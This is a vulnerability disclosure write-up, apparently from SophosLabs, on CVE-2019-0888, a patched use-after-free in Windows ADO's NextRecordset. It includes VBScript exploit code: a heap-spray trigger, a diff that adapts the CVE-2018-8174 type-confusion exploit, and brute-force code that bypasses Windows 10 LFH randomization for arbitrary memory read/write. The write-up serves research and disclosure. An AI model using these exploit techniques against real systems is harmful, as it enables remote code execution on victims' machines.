@@ -1,0 +1,289 @@
+CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)
+
+Details of the vulnerability we reported to Microsoft and was fixed in last month's Patch Tuesday
+
+Written by
+SophosLabs Offensive Security
+
+July 09, 2019
+
+SophosLabs Uncut ADO CVE-2019-0888 Exploit use-after-free VBscript vulnerability Windows
+
+The SophosLabs Offensive Security Research team discovered a security vulnerability in the ActiveX Data Objects (ADO) component of Windows. Microsoft resolved the issue in the June 2019 edition of Patch Tuesday. It has been a month since the patch was released, so we’ve decided to publish the following explanation of the bug, and how to exploit it to achieve an ASLR bypass and Read/Write primitive.
+The article references symbols and types from the 32-bit vbscript.dll file, version 5.812.10240.16384, from Windows 10.
+Background
+ADO is an API to access and manipulate data through an OLE database provider. In our examples to follow, the OLE DB provider is a Microsoft SQL server. Different programs, using a variety of languages, can use this API.
+In the scope of this article, we will make use of ADO from VBScript code running in Internet Explorer, and connect to a Microsoft SQL Server 2014 Express instance running locally.
+
+Here’s an example of a basic VBScript script that establishes a connection to the local database (named SQLEXPRESS) by using an ADO Recordset object:
+
+On Error Resume Next
+
+Set RS = CreateObject("ADOR.Recordset")
+
+RS.Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
+"Provider=SQLOLEDB;" &amp; _
+"Data Source=.\SQLEXPRESS;" &amp; _
+"Initial Catalog=master;" &amp; _
+"Integrated Security=SSPI;" &amp; _
+"Trusted_Connection=True;"
+
+If Err.Number <&gt; 0 Then
+MsgBox("DB open error")
+Else
+MsgBox("DB opened")
+End If
+
+Establishing a connection using ADO from Internet Explorer prompts this security warning, which makes the bug inconvenient to exploit unobtrusively.
+
+The Bug
+The Recordset Object method NextRecordset improperly handles its RecordsAffected parameter.
+When an application calls this method with an Object-typed variable passed to it as the RecordsAffected parameter, the method will leave that object’s reference count decreased by 1, while keeping the variable referenceable.
+When the reference count drops to 0, the operating system destroys the object and deallocates its memory. However, since the object can still be referenced by its variable name, further usage of that variable will cause a Use-After-Free condition.
+These are the important bits about NextRecordset‘s functionality from its documentation:
+
+Use the NextRecordset method to return the results of the next command in a compound command statement or of a stored procedure that returns multiple results.
+The NextRecordset method is not available on a disconnected Recordset object.
+Parameters: RecordsAffectedOptional. A Long variable to which the provider returns the number of records that the current operation affected.
+
+Simply put, the method works on a connected Recordset object, retrieves and returns some sort of database related data, and writes back a number to the provided parameter.
+
+The method is implemented in library msado15.dll with the function CRecordset::NextRecordset. This is how NextRecordset is defined in the library’s COM interface:
+
+If the method is successful at retrieving the database-related data, it calls the internal function ProcessRecordsAffected to handle the assignment of the number of affected records to parameter RecordsAffected.
+Inside ProcessRecordsAffected, the library creates a local variable, called local_copy_of_RecordsAffected , shallow-copies the RecordsAffected parameter into it, and then calls the VariantClear function:
+
+VariantClear is described here. To quote:
+“The function clears a VARIANTARG by setting the vt field to VT_EMPTY.““The current contents of the VARIANTARG are released first. […] If the vt field is VT_DISPATCH, the object is released.”
+VBScript object variables are, essentially, wrapped ActiveX objects, implemented in C++. They are created by the function CreateObject, e.g. variable RS in the above code sample.
+VBScript objects are represented internally as Variant structures of the type VT_DISPATCH. Therefore, in this case, the call to VariantClear will set local_copy_of_RecordsAffected‘s type to VT_EMPTY, and perform a “release” on it, meaning it will invoke its underlying C++ object’s ::Release method, which decrements the object’s reference count by 1 (and destroys the object if the reference count reaches 0).
+After the VariantClear call, the function continues as follows:
+
+This function converts the 64-bit integer variable, RecordsAffectedNum,  into a signed 32-bit integer (referred to here as type VT_I4), and passes that value to VariantChangeType in an attempt to convert it to a variant of type RecordsAffected_vt, which is VT_DISPATCH in the vulnerable scenario.
+No logic exists to convert a VT_I4 type into a VT_DISPATCH type, so VariantChangeType will always fail here, and the early return path will take place. Since RecordsAffected is defined with the out attribute in its COM interface declaration, the way ProcessRecordsAffected handles RecordsAffected will have an impact on the program:
+“The [out] attribute indicates that a parameter that acts as a pointer and its associated data in memory are to be passed back from the called procedure to the calling procedure.“
+Simply put, RecordsAffected is passed back to the program after NextRecordset returns, either in its original state or whatever state it was modified into by ProcessRecordsAffected. Looking back at the execution path the function undergoes in a vulnerable scenario, we can see it reaches the return statement without ever directly modifying RecordsAffected.
+VariantClear is called on a copy of RecordsAffected, so it triggers a release of the copy’s underlying C++ object, and changes the copy’s type to VT_EMPTY.
+Since the copying was done in a shallow way, both RecordsAffected and its copy contain the same pointer to the underlying C++ object; A release of one of the variables is equivalent to a release of the second. However, changing the copy’s type to VT_EMPTY will have no effect on RecordsAffected – its type will remain intact.
+Since RecordsAffected‘s type has not been emptied, it will be passed back to the program and remain referenceable, despite its underlying C++ object being released and, potentially, deallocated.
+Considering how the bug is seemingly triggered on every call to the method, how does it manage to complete a legitimate call without crashing?
+Looking back at the documentation, it specifies that RecordsAffected is supposed to be of type Long (a variant of type VT_I4). VariantClear does not have the same destructive effect on VT_I4 variants as it does on VT_DISPATCH variants (releasing its object). Therefore, as long as calls to the method use a RecordsAffected that fits the intended type, there will be no negative side effects to the program.
+Fix
+The bug was fixed in Microsoft’s June 2019 edition of Patch Tuesday, and was assigned CVE-2019-0888.
+The function ProcessRecordsAffected was patched to omit the local variable local_copy_of_RecordsAffected, instead operating directly on RecordsAffected, correctly emptying its type and preventing it from being passed back to the program.
+
+“Dumb” Exploitation
+The simplest way to achieve some type of exploit primitive with this bug would be to cause an object to be freed, and then immediately spray the heap with controlled-data memory allocations of the same size as the freed object, so that the memory that used to hold the object now holds our own arbitrary data.
+
+On Error Resume Next
+
+Set RS = CreateObject("ADOR.Recordset")
+Set freed_object = CreateObject("ADOR.Recordset")
+
+' Open Recordset connection to database
+RS.Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
+"Provider=SQLOLEDB;" &amp; _
+"Data Source=.\SQLEXPRESS;" &amp; _
+"Initial Catalog=master;" &amp; _
+"Integrated Security=SSPI;" &amp; _
+"Trusted_Connection=True;"
+
+' Connection objects to be used for heap spray later
+Dim array(1000)
+For i = 0 To 1000
+Set array(i) = CreateObject("ADODB.Connection")
+Next
+
+' Data to spray in heap: allocation size will be 0x418
+' (size of CRecordset in 32-bit msado15.dll)
+spray = ChrW(&amp;h4141) &amp; ChrW(&amp;h4141) &amp; _
+ChrW(&amp;h4141) &amp; ChrW(&amp;h4141) &amp; _
+Space(519)
+
+' Trigger bug
+Set Var1 = RS.NextRecordset(freed_object)
+
+' Perform heap spray
+For i = 0 To 1000
+array(i).ConnectionString = spray
+Next
+
+' Trigger use after free
+freed_object.Clone()
+
+Line 4 creates a new VBScript object freed_object, with an underlying C++ object of type CRecordset, a 0x418-byte-sized structure.
+Line 27 decreases freed_object‘s underlying C++ object’s reference count to 0, and should cause the deallocation of its internal resources.
+Line 31 uses the ConnectionString property of the ADODB.Connection class to spray the heap. When a string is assigned into ConnectionString it creates a local copy, allocating a memory chunk with the same size as the assigned string, and copying its contents into it. The spray string is crafted to result in a 0x418-byte allocation.
+Line 35 dereferences freed_object. At this point, any referencing of this variable will invoke a dynamic dispatch on the underlying C++ object, meaning its virtual table pointer will be dereferenced, and a function pointer will be loaded from that memory. Since the virtual table pointer is located at offset 0 of a C++ object, the value that will be loaded, and later cause a memory access violation exception in the first 4 bytes of spray, 0x41414141.
+To make this primitive useful for actual exploitation, we would need to rely on knowing a readable, controllable memory address in the program’s address space – a feat that is rendered impossible by ASLR. A better approach will have to be used to defeat mitigations like ASLR to exploit this bug on modern systems.
+Advanced Exploitation
+While looking for existing research on exploitation methods for similar VBScript bugs that can be of help here, we came across CVE-2018-8174. Dubbed the “Double Kill” exploit, it was detected in the wild by security company Qihoo 360 around May 2018. Plenty of articles have been written about dissecting the captured exploit and underlying bug, so for further details we will refer to these:
+[1] Analysis of CVE-2018-8174 VBScript 0day, 360 Qihoo
+[2] Delving deep into VBScript: Analysis of CVE-2018-8174 exploitation, Kaspersky Lab
+[3] Dissecting modern browser exploit: case study of CVE-2018–8174, piotrflorczyk
+CVE-2018-8174 is a use-after-free bug in VBScript around the handling of the Class_Terminate callback function. Essentially, it gave the ability to arbitrarily free a VBScript object but keep it referenceable, similar to the ADO bug’s properties.
+The captured exploit implemented a sophisticated technique that employs a type confusion attack to turn the use-after-free capability into an ASLR bypass and read-write-everywhere primitive. The technique itself isn’t useful on its own (without a bug to enable it), and is technically not a bug, so it was never “fixed,” and remains present in the code base. The technique is probably best explained in the article by Piotr Florczyk.
+Given the similarities between the 2 bugs, it should be possible to take the commented exploit code for CVE-2018-8174 from Florczyk’s writeup, replace the bug-specific code parts to make use of the ADO bug, and have it successfully work the same way. And, indeed, applying this simple patch…
+
+diff --git a/analysis_base.vbs b/analysis_modified.vbs
+index 6c1cd3f..fd25809 100644
+--- a/analysis_base.vbs
++++ b/analysis_modified.vbs
+@@ -1,3 +1,14 @@
++Dim RS(13)
++For i = 0 to UBound(RS)
++    Set RS(i) = CreateObject("ADOR.Recordset")
++    RS(i).Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
++        "Provider=SQLOLEDB;" &amp; _
++        "Data Source=.\SQLEXPRESS;" &amp; _
++        "Initial Catalog=master;" &amp; _
++        "Integrated Security=SSPI;" &amp; _
++        "Trusted_Connection=True;"
++Next
++
+Dim FreedObjectArray
+Dim UafArrayA(6),UafArrayB(6)
+Dim UafCounter
+@@ -101,7 +112,8 @@ Public Default Property Get Q
+Dim objectImitatingArray
+Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
+For idx=0 To 6
+-        UafArrayA(idx)=0
++        On Error Resume Next
++        Set m = RS(idx).NextRecordset(resueObjectA_arr)
+Next
+Set objectImitatingArray=New FakeReuseClass
+objectImitatingArray.mem = FakeArrayString
+@@ -116,7 +128,8 @@ Public Default Property Get P
+Dim objectImitatingInteger
+P=CDbl("636598737289582e-328") ' db 0, 0, 0, 0, 3, 0, 0, 0
+For idx=0 To 6
+-        UafArrayB(idx)=0
++        On Error Resume Next
++        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
+Next
+Set objectImitatingInteger=New FakeReuseClass
+objectImitatingInteger.mem=Empty16BString
+@@ -136,19 +149,7 @@ Sub UafTrigger
+For idx=20 To 38
+Set objectArray(idx)=New ReuseClass
+Next
+-    UafCounter=0
+-    For idx=0 To 6
+-        ReDim FreedObjectArray(1)
+-        Set FreedObjectArray(1)=New ClassTerminateA
+-        Erase FreedObjectArray
+-    Next
+Set resueObjectA_arr=New ReuseClass
+-    UafCounter=0
+-    For idx=0 To 6
+-        ReDim FreedObjectArray(1)
+-        Set FreedObjectArray(1)=New ClassTerminateB
+-        Erase FreedObjectArray
+-    Next
+Set resueObjectB_int=New ReuseClass
+End Sub
+
+…produces a working exploit for the ADO bug.
+It turns out that this exploit works on systems running Windows 7, but not on Windows 8 or later versions. This is the case with the original captured exploit as well. The exploit breaks due to “Low fragmentation heap (LFH) allocation order randomization”, a security measure for the heap introduced in Windows 8 that breaks simple use-after-free exploitation scenarios.
+Bypassing LFH Allocation Order Randomization
+Here’s one example of how heap behavior changed after Microsoft introduced LFH allocation order randomization:
+
+Introducing allocation order randomization changed the outcome of malloc->free->malloc execution, from following a LIFO (Last In First Out) logic to being non-deterministic.
+Why does this break the exploit? Consider the following excerpt from the commented exploit code:
+
+Class ReplacingClass_Array
+Public Default Property Get Q
+...
+For idx=0 To 6
+On Error Resume Next
+Set m = RS(idx).NextRecordset(reuseObjectA_arr)
+Next
+Set objectImitatingArray=New FakeReuseClass
+...
+
+In VBScript, all custom class objects are internally represented by the VBScriptClass C++ class. VBScript calls the function VBScriptClass::Create  when it executes a custom class object instantiation statement (for example, line 8). It makes a 0x44-byte-sized allocation to hold the VBScriptClass object.
+When control reaches line 8, the For loop has just finished destroying reuseObjectA_arr, which is an instance of custom class ReuseClass. This will cause the VBScriptClass destructor to be called, freeing the 0x44 bytes that had been previously allocated. Line 8 then goes on to create a new object, objectImitatingArray, of a different custom class: FakeReuseClass.
+The basis for a successful run of the type confusion attack is the assumption that objectImitatingArray will be assigned the same heap memory resources as the just-freed reuseObjectA_arr. However as noted before, with allocation order randomization enabled, you can’t make this assumption; the randomized heap breaks the exploit.
+As a result of the type confusion attack, a memory corruption occurs. The heap allocation where corruption occurs is not the top-level (0x44) allocation of VBScriptClass itself, but a certain 0x108 bytes sized sub-allocation tied to it, used to store the object’s methods and variables. The function responsible for this sub-allocation is NameList::FCreateVval and is called shortly after the creation of a VBScriptClass (see article [2]).
+To be more specific about the condition that needs to be met, the type confusion will work if, after the destruction of reuseObjectA_arr, a new VBScript object receives the same address for its 0x108 allocation as the one reuseObjectA_arr previously held. Other allocations tied to the two objects, including the 0x44 sized top-level allocation, don’t necessarily have to get matching addresses.
+The specifics of the memory corruption part of the technique is not very straightforward to understand and it’s advised to read the Kaspersky background article to get a better understanding of it, but here’s the gist of it.
+ReuseClass‘s method, SetProp, has the following statement: mem=Value. Value is an object variable, so its Default Property Getter will have to be invoked before the assignment can be completed.
+The VBScript engine (vbscript.dll) calls internal function AssignVar to perform an assignment of this kind. This is a simplified pseudo-code to explain how it works:
+
+AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
+// here, destinationObject is a ReuseClass instance, destinationVariableName is "mem", source is <Value&gt;
+
+// get the address of object <destinationObject&gt;'s member variable with the name <destinationVariableName&gt;.
+VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);
+
+// if the given source is an object, call the object's
+// default property getter to get the actual source value
+if (source-&gt;vt == VT_IDISPATCH) {
+VARIANT *sourceValue = VAR::InvokeByDispID(source);
+}
+
+// perform the assignment
+*destinationPointer = *sourceValue;
+}
+
+The function VAR::InvokeByDispID invokes the source object’s default property getter, allowing us to run arbitrary VBScript code in the midst of AssignVar‘s execution. If we use that space to trigger the destruction and replacement in memory of destinationObject (using the bug), we can take advantage of AssignVar proceeding to perform the assignment into destinationPointer (line 14) without realizing the memory it points to could have been tampered with.
+The memory address being written into is the value returned by CScriptRuntime::GetVarAdr, which is a pointer to somewhere inside the given object’s 0x108 allocation. Its exact offset into the allocation depends on the given object’s class definition – particularly, how long the names of its methods and fields are.
+ReuseClass and FakeReuseClass‘s definitions are arranged in a way to force a different offset for common member variable mem. Doing this, we’re forcing the final assignment to corrupt an object’s mem variable’s header in order to turn it into an Array type whose base pointer is NULL and its length is 0x7fffffff.
+CVE-2018-8174’s exploit uses a one-shot approach for attempting to pull off the type confusion attack, meaning that only a single new object is created after the destruction of reuseObjectA_arr. As we explained before, this will only reliably work on Windows systems prior to Windows 8, which lack the LFH Allocation Order Randomization feature.
+To make this exploit work on Windows 10 systems, we can implement a brute-force approach for attempting the type confusion attack. Instead of creating a single new object, we can mass-create new objects to ensure the freed 0x108 allocation will ultimately get assigned into one of them.
+Here’s how the code can be transformed into implementing a brute-force approach:
+Set reuseObjectA_arr=New ReuseClass
+...
+Class ReplacingClass_Array
+Public Default Property Get Q
+Dim objectImitatingArray
+
+Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
+
+For i=0 To 6
+DecrementRefcount(reuseObjectA_arr)
+Next
+
+For i=0 to UBound(UafArrayA)
+Set objectImitatingArray=New FakeReuseClass
+objectImitatingArray.mem = FakeArrayString
+For j=0 To 6
+Set UafArrayA(i,j)=objectImitatingArray
+Next
+Next
+End Property
+End Class
+Here’s a visualization of the above code’s logic in action:
+
+UafArrayA(38) receives the same 0x108 allocation (Vval) as reuseObjectA_arr
+
+After the UafArrayA array has been mass-filled with new FakeReuseClass objects and the mem=Value assignment completes, we can iterate over the array and find the object whose mem variable has been successfully corrupted to become an array:
+
+For i=0 To UBound(UafArrayA)
+Err.Clear
+a = UafArrayA(i,0).mem(Empty16BString_addr)
+If Err.Number = 0 Then
+Exit For
+End If
+Next
+If i > UBound(UafArrayA) Then
+MsgBox("Could not find an object corrupted by reuseObjectA_arr")
+Else
+MsgBox("Got UafArrayA_obj from UafArrayA(" & i & ")")
+Set UafArrayA_obj = UafArrayA(i,0)
+End If
+
+The corrupted object will be the only one not to cause an exception to be thrown on line 3. Once we find it, it can be referenced with any index, allowing to read and write all addresses in the process memory space.
+
+With this fix to the original exploit, it now works on Windows 10 systems as well.
+
+PoC
+
+You can find the proof-of-concept file on the SophosLabs GitHub repository.
+
+Share on Facebook
+
+Share on Twitter
+
+Share on LinkedIn
